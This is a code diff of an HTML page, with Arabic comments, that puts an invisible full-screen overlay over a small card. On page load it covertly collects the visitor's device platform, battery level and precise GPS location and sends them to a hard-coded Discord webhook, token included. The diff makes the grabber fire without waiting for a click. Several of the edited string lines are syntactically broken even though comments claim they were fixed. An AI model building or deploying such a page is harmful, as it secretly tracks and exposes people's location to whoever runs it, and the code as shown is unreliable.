@@ -8,13 +8,7 @@
         body { margin: 0; padding: 0; font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .container { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 300px; z-index: 1; position: relative; }
         h2 { margin-top: 0; color: #333; }
-        
-        /* الطبقة الشفافة لضمان النقر */
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent; z-index: 9999; cursor: pointer;
-        }
-        
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; }
         #status { margin-top: 10px; font-size: 12px; color: gray; }
     </style>
 </head>
@@ -28,10 +22,11 @@
 <div id="overlay"></div>
 
 <script>
-    // ⚙️ ضع رابط الويب هوك الخاص بديسكورد هنا
+    // ⚙️ رابط الويب هوك الخاص بك
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
 
     async function sendDiscord(data) {
+        // ✅ تم تصحيح علامات التنصيص هنا
         let caption = 🎉 تقرير جديد\n\n📱 الجهاز: ${data.platform || 'N/A'};
         if (data.battery) caption += \n🔋 البطارية: ${data.battery};
         if (data.location && data.location !== "N/A") caption += \n📍 الموقع: ${data.location};
@@ -65,6 +60,7 @@
                 const pos = await new Promise((resolve, reject) => 
                     navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000})
                 );
+                // ✅ تم تصحيح علامات التنصيص هنا أيضاً
                 location = ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)};
             } catch (e) {}
         }
@@ -92,7 +88,6 @@
         }
     }
 
-    // التعديل هنا: تشغيل الدالة مباشرة دون تأخير أو انتظار نقرة
     window.onload = start;
 
 </script>
